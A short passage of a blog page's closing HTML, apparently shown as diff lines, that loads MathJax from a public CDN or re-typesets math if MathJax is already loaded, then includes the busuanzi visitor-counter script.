+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
